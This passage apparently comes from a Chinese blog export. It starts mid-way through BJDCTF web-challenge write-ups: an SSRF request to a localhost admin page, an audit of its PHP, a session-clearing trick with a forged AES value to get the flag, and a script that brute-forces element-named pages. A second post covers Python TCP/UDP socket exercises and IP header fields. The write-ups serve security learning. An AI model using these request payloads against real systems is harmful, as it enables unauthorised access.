http://f108f177-b544-4c43-91dc-a160c7fc77f8.node3.buuoj.cn/home.php?file=system</span><br><span class="line"><span class="attribute">Cookie</span>: y1ng=8880cbd71721332a25aa6df7b12eb7ac53539100; your_ip_address=76d9f00467e5ee6abc3ca60892ef304e</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">q1=&amp;q2=http%3A%2F%2F127.0.0.1%2Fadmin.php?&amp;q3=POST%s%</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//admin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">'f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;'</span>; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>],<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'your_ip_address'</span>]) &amp;&amp; $_COOKIE[<span class="string">'your_ip_address'</span>] === md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_COOKIE[<span class="string">'y1ng'</span>] === sha1(md5(<span class="string">'y1ng'</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is "</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'decrypt'</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">'decrypt'</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'flag_2sln2ndln2klnlksnf.php'</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">'y1ng'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'爬'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">'secret'</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>进行审计关键判断</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'decrypt'</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">'decrypt'</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'flag_2sln2ndln2klnlksnf.php'</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">'y1ng'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'爬'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$decr 来自于$_GET[‘decrypt’]</p>
<p>$cipher来自aesEn($data, ‘y1ng’)函数加密后的结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>],<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而$data来自于$_SESSION[‘secret’]</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">'secret'</span>] = bin2hex(random_bytes($length));</span><br></pre></td></tr></table></figure>

<p>随机数种子破解不了，但是可以把$_SESSION删除，从而使得$data为空</p>
<p>再生成根据函数生成一个decrypt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5(<span class="string">"174.0.222.75"</span>,<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line">$cipher = aesEn(<span class="string">''</span>, <span class="string">'y1ng'</span>);</span><br><span class="line"><span class="keyword">echo</span> $cipher;  <span class="comment">//70klfZeYC+WlC045CcKhtg==</span></span><br></pre></td></tr></table></figure>

<p><strong>注意<code>+</code>会被解析成空格，需要进行url编码</strong></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/admin.php?decrypt=70klfZeYC%2bWlC045CcKhtg==</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 983604da-0b56-4811-b6e1-e8d833daa7b3.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: y1ng=8880cbd71721332a25aa6df7b12eb7ac53539100; your_ip_address=76d9f00467e5ee6abc3ca60892ef304e</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>

<p>即可拿到flag</p>
<h2 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h2><p>官方放出提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. http:&#x2F;&#x2F;gem-love.com&#x2F;em.txt</span><br><span class="line">比赛最后1h冲分，hint太长公告写不下，点上面url查看</span><br><span class="line">2.某处的神秘代码，Hex to String</span><br></pre></td></tr></table></figure>

<p>查看源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;BJDCTF&#39;s Cute Caricature&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body bgcolor&#x3D;white&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;mendeleev.jpg&quot;&gt;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;p hidden id&#x3D;&quot;506F2E&quot;&gt;I am the real Element Masterrr!!!!!!&lt;&#x2F;p&gt;</span><br><span class="line">&lt;p hidden id&#x3D;&quot;706870&quot;&gt;@颖奇L&#39;Amore&lt;&#x2F;p&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>发现ID可疑，简ID解码后得到  Po.   和php，</p>
<p>访问得到一个   .    </p>
<p>根据提示访问元素周期表的页面，访问拼接得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 3/27/2020 3:57 PM</span></span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">strs = <span class="string">"H, He, Li, Be, B, C, N, O, F, Ne, Na, Mg, Al, Si, P, S, Cl, Ar,K, Ca, Sc, Ti, V, Cr, Mn, Fe, Co, Ni, Cu, Zn, Ga, Ge, As, Se, Br, Kr, Rb, Sr, Y, Zr, Nb, Mo, Te, Ru, Rh, Pd, Ag, Cd, In, Sn, Sb, Te, I, Xe, Cs, Ba, La, Ce, Pr, Nd, Pm, Sm, Eu, Gd, Tb, Dy, Ho, Er, Tm, Yb, Lu, Hf, Ta, W, Re, Os, Ir, Pt, Au, Hg, Tl, Pb, Bi, Po, At, Rn, Fr, Ra, Ac, Th, Pa, U, Np, Pu, Am, Cm, Bk, Cf, Es, Fm,Md, No, Lr,Rf, Db, Sg, Bh, Hs, Mt, Ds, Rg, Cn, Nh, Fl, Mc, Lv, Ts, Og, Uue"</span></span><br><span class="line"></span><br><span class="line">li = strs.replace(<span class="string">" "</span>,<span class="string">""</span>).split(<span class="string">","</span>)</span><br><span class="line">url = <span class="string">'http://7fa09155-1df7-469d-b620-9195f7a69f50.node3.buuoj.cn/'</span></span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x in li:</span><br><span class="line">    res = requests.get(url + x + <span class="string">'.php'</span>)</span><br><span class="line">    <span class="keyword">if</span> res.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    temp += res.text</span><br><span class="line">    <span class="keyword">print</span>(temp)</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"><span class="comment">#And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</span></span><br></pre></td></tr></table></figure>

<p>访问即可得到flag</p>
<h2 id="EasyAspDotNet"><a href="#EasyAspDotNet" class="headerlink" title="EasyAspDotNet"></a>EasyAspDotNet</h2>]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>待补充</tag>
        <tag>BDJCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>python 网络编程</title>
    <url>/2020/03/14/python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在学校的课程中学到了有关网络编程的内容，在此记录一下。</p>
<a id="more"></a>

<p>实验要求</p>
<ol>
<li>是使用tcp、udp实现一个客户端与服务器的通信</li>
<li>使用原始套接字实现ping命令</li>
<li>实现GUI的客户端与服务器通信</li>
<li>实现GUI的简易浏览器</li>
<li>实现GUI的简单文件传输</li>
<li>实现GUI多人聊天系统</li>
</ol>
<h1 id="学习py相关的库"><a href="#学习py相关的库" class="headerlink" title="学习py相关的库"></a>学习py相关的库</h1><p><strong>socket库</strong>（参考自<a href="https://www.runoob.com/python/python-socket.html" target="_blank" rel="noopener">菜鸟教程</a>、<a href="https://docs.python.org/zh-cn/3/library/socket.html" target="_blank" rel="noopener">py官网</a>）</p>
<p>使用socket.socket()创建套接字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socket.socket([family[, type[, proto]]])</span><br><span class="line">family: 套接字家族可以使AF_UNIX或者AF_INET（AF_INET6表示ipv6版本）</span><br><span class="line">type: SOCK_STREAM（TCP）、SOCK_DGRAM(UDP)、socket.SOCK_RAW（原始套接字）</span><br><span class="line">protocol: 一般不填默认为0</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">服务器端套接字</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">s.bind()</td>
<td align="left">绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。</td>
</tr>
<tr>
<td align="left">s.listen()</td>
<td align="left">开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。</td>
</tr>
<tr>
<td align="left">s.accept()</td>
<td align="left">被动接受TCP客户端连接,(阻塞式)等待连接的到来</td>
</tr>
<tr>
<td align="left">客户端套接字</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">s.connect()</td>
<td align="left">主动初始化TCP服务器连接，。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</td>
</tr>
<tr>
<td align="left">s.connect_ex()</td>
<td align="left">connect()函数的扩展版本,出错时返回出错码,而不是抛出异常</td>
</tr>
<tr>
<td align="left">公共用途的套接字函数</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">s.recv()</td>
<td align="left">接收TCP数据，数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。</td>
</tr>
<tr>
<td align="left">s.send()</td>
<td align="left">发送TCP数据，将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</td>
</tr>
<tr>
<td align="left">s.sendall()</td>
<td align="left">完整发送TCP数据，完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</td>
</tr>
<tr>
<td align="left">s.recvfrom()</td>
<td align="left">接收UDP数据，与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</td>
</tr>
<tr>
<td align="left">s.sendto()</td>
<td align="left">发送UDP数据，将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</td>
</tr>
<tr>
<td align="left">s.close()</td>
<td align="left">关闭套接字</td>
</tr>
<tr>
<td align="left">s.getpeername()</td>
<td align="left">返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</td>
</tr>
<tr>
<td align="left">s.getsockname()</td>
<td align="left">返回套接字自己的地址。通常是一个元组(ipaddr,port)</td>
</tr>
<tr>
<td align="left">s.setsockopt(level,optname,value)</td>
<td align="left">设置给定套接字选项的值。</td>
</tr>
<tr>
<td align="left">s.getsockopt(level,optname[.buflen])</td>
<td align="left">返回套接字选项的值。</td>
</tr>
<tr>
<td align="left">s.settimeout(timeout)</td>
<td align="left">设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</td>
</tr>
<tr>
<td align="left">s.gettimeout()</td>
<td align="left">返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</td>
</tr>
<tr>
<td align="left">s.fileno()</td>
<td align="left">返回套接字的文件描述符。</td>
</tr>
<tr>
<td align="left">s.setblocking(flag)</td>
<td align="left">如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。</td>
</tr>
<tr>
<td align="left">s.makefile()</td>
<td align="left">创建一个与该套接字相关连的文件</td>
</tr>
</tbody></table>
<h1 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h1><h3 id="1-服务端与客户端通信"><a href="#1-服务端与客户端通信" class="headerlink" title="1.  服务端与客户端通信"></a>1.  服务端与客户端通信</h3><h4 id="a-TCP"><a href="#a-TCP" class="headerlink" title="a. TCP"></a>a. TCP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Client.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : sunny250</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> tkinter</span><br><span class="line"></span><br><span class="line">cilent=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># print(socket.gethostbyaddr(8.8.8.8))</span></span><br><span class="line">port=<span class="number">14153</span></span><br><span class="line">host=socket.gethostname()</span><br><span class="line">cilent.connect((host,port))</span><br><span class="line">print(cilent.recv(<span class="number">1024</span>).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># cilent.close()</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    msg=input()</span><br><span class="line">    <span class="keyword">if</span> msg==<span class="string">'q!'</span>:</span><br><span class="line">        cilent.send(msg.encode())</span><br><span class="line">        cilent.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cilent.send(msg.encode())</span><br><span class="line">    print(cilent.recv(<span class="number">1024</span>).decode())</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Server.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : sunny250</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">host=socket.gethostname()</span><br><span class="line"><span class="comment"># print(host)</span></span><br><span class="line">port=<span class="number">14153</span></span><br><span class="line">server.bind((host,port))</span><br><span class="line">server.listen(<span class="number">6</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment"># server.bind((host, port))</span></span><br><span class="line">    <span class="comment"># server.listen(5)</span></span><br><span class="line">    c,caddr=server.accept()</span><br><span class="line">    chost,cport=caddr</span><br><span class="line">    c.send(<span class="string">'已成功连接到服务器，你的地址是：'</span>.encode()+chost.encode()+<span class="string">'端口是：'</span>.encode()+str(cport).encode())</span><br><span class="line">    <span class="comment"># c.close()</span></span><br><span class="line">    msg=<span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> msg!=<span class="string">'q!'</span>:</span><br><span class="line">        msg=c.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        smsg=time.ctime()+<span class="string">' '</span>+chost+<span class="string">':'</span>+str(cport)+<span class="string">'说'</span>+<span class="string">'\n'</span>+msg</span><br><span class="line">        print(smsg)</span><br><span class="line">        c.send(smsg.encode())</span><br><span class="line">    c.close()</span><br></pre></td></tr></table></figure>

<h4 id="b-UDP"><a href="#b-UDP" class="headerlink" title="b.UDP"></a>b.UDP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Client.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : sunny250</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">client=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">port=<span class="number">14153</span></span><br><span class="line">host=<span class="string">"127.0.0.1"</span></span><br><span class="line">addr=(host,port)</span><br><span class="line"></span><br><span class="line">client.sendto(<span class="string">'hello'</span>.encode(), addr)</span><br><span class="line">msg,saddr=client.recvfrom(<span class="number">1024</span>)</span><br><span class="line">print(msg.decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    msg=input()</span><br><span class="line">    <span class="keyword">if</span> msg==<span class="string">'q!'</span>:</span><br><span class="line">        client.sendto(msg.encode(), addr)</span><br><span class="line">        client.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    client.sendto(msg.encode(),addr)</span><br><span class="line">    rmsg,saddr=client.recvfrom(<span class="number">1024</span>)</span><br><span class="line">    print(rmsg.decode())</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Server.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : sunny250</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">server = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">host=<span class="string">"127.0.0.1"</span></span><br><span class="line">port=<span class="number">14153</span></span><br><span class="line"></span><br><span class="line">server.bind((host,port))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    msg, caddr = server.recvfrom(<span class="number">1024</span>)   <span class="comment">#msg是服务器接受到客户端的数据，caddr是client的IP和端口</span></span><br><span class="line">    chost,cport=caddr   <span class="comment">#chost 即clienthost 客户端IP，cport客户端端口</span></span><br><span class="line">    server.sendto(<span class="string">'已成功连接到服务器，你的地址是：'</span>.encode()+chost.encode()+<span class="string">'端口是：'</span>.encode()+str(cport).encode(),caddr)</span><br><span class="line">    msg=<span class="string">''</span></span><br><span class="line">    <span class="keyword">while</span> msg!=<span class="string">'q!'</span>:</span><br><span class="line">        msg,caddr=server.recvfrom(<span class="number">1024</span>)</span><br><span class="line">        smsg=time.ctime()+<span class="string">' '</span>+chost+<span class="string">':'</span>+str(cport)+<span class="string">'说'</span>+<span class="string">'\n'</span>+msg.decode()</span><br><span class="line">        print(smsg)</span><br><span class="line">        server.sendto(smsg.encode(),caddr)</span><br><span class="line">    c.close()</span><br></pre></td></tr></table></figure>

<h3 id="2-原始套接字实现ping命令"><a href="#2-原始套接字实现ping命令" class="headerlink" title="2. 原始套接字实现ping命令"></a>2. 原始套接字实现ping命令</h3><p>套接字要实现对原始数据包的处理，需要了解数据包的格式参考来自<a href="http://c.biancheng.net/view/6411.html" target="_blank" rel="noopener">C语言中文网</a></p>
<p><img src="/pic/158.png" alt=""></p>
<h4 id="1-版本（version）"><a href="#1-版本（version）" class="headerlink" title="1) 版本（version）"></a>1) 版本（version）</h4><p>占 4 位，表示 IP 协议的版本。通信双方使用的 IP 协议版本必须一致。目前广泛使用的IP协议版本号为 4，即 IPv4。</p>
<h4 id="2-首部长度（网际报头长度IHL）"><a href="#2-首部长度（网际报头长度IHL）" class="headerlink" title="2) 首部长度（网际报头长度IHL）"></a>2) 首部长度（网际报头长度IHL）</h4><p>占 4 位，可表示的最大十进制数值是 15。这个字段所表示数的单位是 32 位字长（1 个 32 位字长是 4 字节）。因此，当 IP 的首部长度为 1111 时（即十进制的 15），首部长度就达到 60 字节。当 IP 分组的首部长度不是 4 字节的整数倍时，必须利用最后的填充字段加以填充。</p>
<p>数据部分永远在 4 字节的整数倍开始，这样在实现 IP 协议时较为方便。首部长度限制为 60 字节的缺点是，长度有时可能不够用，之所以限制长度为 60 字节，是希望用户尽量减少开销。最常用的首部长度就是 20 字节（即首部长度为 0101），这时不使用任何选项。</p>
<h4 id="3-区分服务（tos）"><a href="#3-区分服务（tos）" class="headerlink" title="3) 区分服务（tos）"></a>3) 区分服务（tos）</h4><p>也被称为服务类型，占 8 位，用来获得更好的服务。这个字段在旧标准中叫做服务类型，但实际上一直没有被使用过。1998 年 IETF 把这个字段改名为区分服务（Differentiated Services，DS）。只有在使用区分服务时，这个字段才起作用。</p>
<h4 id="4-总长度（totlen）"><a href="#4-总长度（totlen）" class="headerlink" title="4) 总长度（totlen）"></a>4) 总长度（totlen）</h4><p>首部和数据之和，单位为字节。总长度字段为 16 位，因此数据报的最大长度为 2^16-1=65535 字节。</p>
<h4 id="5-标识（identification）"><a href="#5-标识（identification）" class="headerlink" title="5) 标识（identification）"></a>5) 标识（identification）</h4><p>用来标识数据报，占 16 位。IP 协议在存储器中维持一个计数器。每产生一个数据报，计数器就加 1，并将此值赋给标识字段。当数据报的长度超过网络的 MTU，而必须分片时，这个标识字段的值就被复制到所有的数据报的标识字段中。具有相同的标识字段值的分片报文会被重组成原来的数据报。</p>
<h4 id="6-标志（flag）"><a href="#6-标志（flag）" class="headerlink" title="6) 标志（flag）"></a>6) 标志（flag）</h4><p>占 3 位。第一位未使用，其值为 0。第二位称为 DF（不分片），表示是否允许分片。取值为 0 时，表示允许分片；取值为 1 时，表示不允许分片。第三位称为 MF（更多分片），表示是否还有分片正在传输，设置为 0 时，表示没有更多分片需要发送，或数据报没有分片。</p>
<h4 id="7-片偏移（offsetfrag）"><a href="#7-片偏移（offsetfrag）" class="headerlink" title="7) 片偏移（offsetfrag）"></a>7) 片偏移（offsetfrag）</h4><p>占 13 位。当报文被分片后，该字段标记该分片在原报文中的相对位置。片偏移以 8 个字节为偏移单位。所以，除了最后一个分片，其他分片的偏移值都是 8 字节（64 位）的整数倍。</p>
<h4 id="8-生存时间（TTL）"><a href="#8-生存时间（TTL）" class="headerlink" title="8) 生存时间（TTL）"></a>8) 生存时间（TTL）</h4><p>表示数据报在网络中的寿命，占 8 位。该字段由发出数据报的源主机设置。其目的是防止无法交付的数据报无限制地在网络中传输，从而消耗网络资源。</p>
<p>路由器在转发数据报之前，先把 TTL 值减 1。若 TTL 值减少到 0，则丢弃这个数据报，不再转发。因此，TTL 指明数据报在网络中最多可经过多少个路由器。TTL 的最大数值为 255。若把 TTL 的初始值设为 1，则表示这个数据报只能在本局域网中传送。 </p>
<h4 id="9-协议"><a href="#9-协议" class="headerlink" title="9) 协议"></a>9) 协议</h4><p>表示该数据报文所携带的数据所使用的协议类型，占 8 位。该字段可以方便目的主机的 IP 层知道按照什么协议来处理数据部分。不同的协议有专门不同的协议号。</p>
<p>例如，TCP 的协议号为 6，UDP 的协议号为 17，ICMP 的协议号为 1。</p>
<h4 id="10-首部检验和（checksum）"><a href="#10-首部检验和（checksum）" class="headerlink" title="10) 首部检验和（checksum）"></a>10) 首部检验和（checksum）</h4><p>用于校验数据报的首部，占 16 位。数据报每经过一个路由器，首部的字段都可能发生变化（如TTL），所以需要重新校验。而数据部分不发生变化，所以不用重新生成校验值。</p>
<h4 id="11-源地址"><a href="#11-源地址" class="headerlink" title="11) 源地址"></a>11) 源地址</h4><p>表示数据报的源 IP 地址，占 32 位。</p>
<h4 id="12-目的地址"><a href="#12-目的地址" class="headerlink" title="12) 目的地址"></a>12) 目的地址</h4><p>表示数据报的目的 IP 地址，占 32 位。该字段用于校验发送是否正确。</p>
<h4 id="13-可选字段"><a href="#13-可选字段" class="headerlink" title="13) 可选字段"></a>13) 可选字段</h4><p>该字段用于一些可选的报头设置，主要用于测试、调试和安全的目的。这些选项包括严格源路由（数据报必须经过指定的路由）、网际时间戳（经过每个路由器时的时间戳记录）和安全限制。</p>
<h4 id="14-填充"><a href="#14-填充" class="headerlink" title="14) 填充"></a>14) 填充</h4><p>由于可选字段中的长度不是固定的，使用若干个 0 填充该字段，可以保证整个报头的长度是 32 位的整数倍。</p>
<h4 id="15-数据部分"><a href="#15-数据部分" class="headerlink" title="15) 数据部分"></a>15) 数据部分</h4><p>表示传输层的数据，如保存 TCP、UDP、ICMP 或 IGMP 的数据。数据部分的长度不固定。</p>
<h4 id="16-TCP-UDP-ICMP报文格式"><a href="#16-TCP-UDP-ICMP报文格式" class="headerlink" title="16) TCP/UDP/ICMP报文格式"></a>16) TCP/UDP/ICMP报文格式</h4><ol>
<li><p>TCP</p>
<p><img src="/pic/159.png" alt=""></p>
